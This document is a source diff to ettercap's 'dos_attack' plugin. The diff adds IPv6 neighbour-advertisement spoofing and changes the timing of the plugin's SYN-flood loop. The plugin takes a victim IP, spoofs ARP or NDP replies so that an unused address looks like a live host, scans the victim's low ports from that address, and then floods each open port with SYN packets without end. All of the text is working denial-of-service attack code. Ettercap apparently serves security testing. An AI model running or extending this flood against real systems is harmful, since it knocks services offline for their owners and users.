@@ -27,12 +27,17 @@
 #include <ec_packet.h>
 #include <ec_send.h>                   
 #include <ec_threads.h>
+#include <time.h>
 
 /* protos */
 int plugin_load(void *);
 static int dos_attack_init(void *);
 static int dos_attack_fini(void *);
 static void parse_arp(struct packet_object *po);
+
+#ifdef WITH_IPV6
+static void parse_icmp6(struct packet_object *po);
+#endif
 static void parse_tcp(struct packet_object *po);
 EC_THREAD_FUNC(syn_flooder);
 
@@ -50,17 +55,17 @@ SLIST_HEAD(, port_list) port_table;
 /* plugin operations */
 struct plugin_ops dos_attack_ops = { 
    /* ettercap version MUST be the global EC_VERSION */
-   ettercap_version: EC_VERSION,                        
+   .ettercap_version =  EC_VERSION,                        
    /* the name of the plugin */
-   name:             "dos_attack",  
+   .name =              "dos_attack",  
     /* a short description of the plugin (max 50 chars) */                    
-   info:             "Run a d.o.s. attack against an IP address",  
+   .info =              "Run a d.o.s. attack against an IP address",  
    /* the plugin version. */ 
-   version:          "1.0",   
+   .version =           "1.0",   
    /* activation function */
-   init:             &dos_attack_init,
+   .init =              &dos_attack_init,
    /* deactivation function */                     
-   fini:             &dos_attack_fini,
+   .fini =              &dos_attack_fini,
 };
 
 /**********************************************************/
@@ -75,7 +80,7 @@ int plugin_load(void *handle)
 
 static int dos_attack_init(void *dummy) 
 {
-   struct in_addr ipaddr;   
+   u_int8 ipaddr[MAX_IP_ADDR_LEN];   
    char dos_addr[MAX_ASCII_ADDR_LEN];
    char unused_addr[MAX_ASCII_ADDR_LEN];
    struct port_list *p;
@@ -93,18 +98,21 @@ static int dos_attack_init(void *dummy)
    memset(unused_addr, 0, sizeof(dos_addr));
 
    ui_input("Insert victim IP: ", dos_addr, sizeof(dos_addr), NULL);
-   if (inet_aton(dos_addr, &ipaddr) == 0) {
+   if (ip_addr_pton(dos_addr, &victim_host) == -EINVALID) {
       INSTANT_USER_MSG("dos_attack: Invalid IP address.\n");
       return PLUGIN_FINISHED;
    }
-   ip_addr_init(&victim_host, AF_INET, (char *)&ipaddr);
 
    ui_input("Insert unused IP: ", unused_addr, sizeof(unused_addr), NULL);
-   if (inet_aton(unused_addr, &ipaddr) == 0) {
+   if (ip_addr_pton(unused_addr, &fake_host) == -EINVALID) {
       INSTANT_USER_MSG("dos_attack: Invalid IP address.\n");
       return PLUGIN_FINISHED;
    }
-   ip_addr_init(&fake_host, AF_INET, (char *)&ipaddr);
+
+   if(victim_host.addr_type != fake_host.addr_type) {
+      INSTANT_USER_MSG("dos_attack: Address' families don't match.\n");
+      return PLUGIN_FINISHED;
+   }
 
    INSTANT_USER_MSG("dos_attack: Starting scan against %s [Fake Host: %s]\n", dos_addr, unused_addr);
 
@@ -116,7 +124,12 @@ static int dos_attack_init(void *dummy)
    }
 
    /* Add the hook to "create" the fake host */
-   hook_add(HOOK_PACKET_ARP_RQ, &parse_arp);
+   if(ntohs(fake_host.addr_type) == AF_INET)
+      hook_add(HOOK_PACKET_ARP_RQ, &parse_arp);
+#ifdef WITH_IPV6
+   else if(ntohs(fake_host.addr_type) == AF_INET6)
+      hook_add(HOOK_PACKET_ICMP6_NSOL, &parse_icmp6);
+#endif
 
    /* Add the hook for SYN-ACK reply */
    hook_add(HOOK_PACKET_TCP, &parse_tcp);
@@ -159,13 +172,22 @@ EC_THREAD_FUNC(syn_flooder)
    u_int32 seq = 0xabadc0de;
    struct port_list *p;
 
+#if !defined(OS_WINDOWS)
+   struct timespec tm;
+   tm.tv_sec = 0;
+   tm.tv_nsec = 1000*1000;
+#endif
    /* init the thread and wait for start up */
    ec_thread_init();
  
    /* First "scan" ports from 1 to 1024 */
    for (dport=1; dport<1024; dport++) {
       send_tcp(&fake_host, &victim_host, sport++, htons(dport), seq++, 0, TH_SYN);
+#if !defined(OS_WINDOWS)
+      nanosleep(&tm, NULL);
+#else
       usleep(1000);
+#endif
    }
 
    INSTANT_USER_MSG("dos_attack: Starting attack...\n");
@@ -177,7 +199,11 @@ EC_THREAD_FUNC(syn_flooder)
       SLIST_FOREACH(p, &port_table, next)    
          send_tcp(&fake_host, &victim_host, sport++, p->port, seq++, 0, TH_SYN);
 	 
-      usleep(500);
+#if !defined(OS_WINDOWS)
+      nanosleep(&tm, NULL);
+#else
+      usleep(1000);
+#endif
    }
    
    return NULL;
@@ -189,6 +215,16 @@ static void parse_arp(struct packet_object *po)
    if (!ip_addr_cmp(&fake_host, &po->L3.dst)) 
       send_arp(ARPOP_REPLY, &po->L3.dst, GBL_IFACE->mac, &po->L3.src, po->L2.src);
 }
+
+#ifdef WITH_IPV6
+static void parse_icmp6(struct packet_object *po)
+{
+   struct ip_addr ip;
+   ip_addr_init(&ip, AF_INET6, po->L4.options);
+   if(!ip_addr_cmp(&fake_host, &ip))
+      send_icmp6_nadv(&fake_host, &po->L3.src, &fake_host, GBL_IFACE->mac, 0);
+}
+#endif
 
 /* 
  * Populate the open port list and reply to 
